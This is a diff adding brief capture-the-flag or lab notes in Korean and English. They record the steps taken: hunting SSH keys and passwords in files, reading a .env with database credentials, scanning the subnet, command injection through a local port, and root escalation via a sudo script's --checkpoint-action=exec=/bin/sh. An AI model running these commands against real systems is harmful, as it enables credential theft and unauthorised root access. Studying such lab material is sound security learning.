@@ -1,0 +1,31 @@
+find / -name id_rsa 2>/dev/null
+-> cat /opt/backups/id_rsa # ssh키
+
+grep -ri "password" /var/www
+/var/www/.env:DB_PASSWORD=Sunset-River-42
+/var/www/config.php:$db_password=Sunset-River-42;
+
+cat /var/www/.env
+APP_ENV = production
+APP_NAME = fileserver
+DB_HOST = db.internal
+DB_PORT = 5432
+DB_NAME = appdb
+DB_USER = webadmin
+DB_PASSWORD = Sunset-River-42
+
+ifconfig -  내 ip주소 10.0.10.5, 마스크 255.255.255.0
+nmap 10.0.10.0/24 -> 10.0.10.20 : 22, 53, 80
+dig -x 10.0.10.20 -> fileserver.local  도메인 
+
+ps aux -> root 권한으로 열려있는 수상한 파이썬 파일 발견
+ss -tulnp 열려있으면 안 될 포트 열려있는 것 확인
+nc 127.0.0.1:7331로 command injection
+-> root 권한으로 /root에 있는 flag.txt 획득
+
+touch /tmp/x
+sudo /usr/local/sbin/log-collect.sh --checkpoint=1 \
+--checkpoint-action=exec=/bin/sh /tmp/x
+-> checkpoint마다 /bin/sh를 실행하는데 sudo라서 root 권한 sh 실행가능
+
+
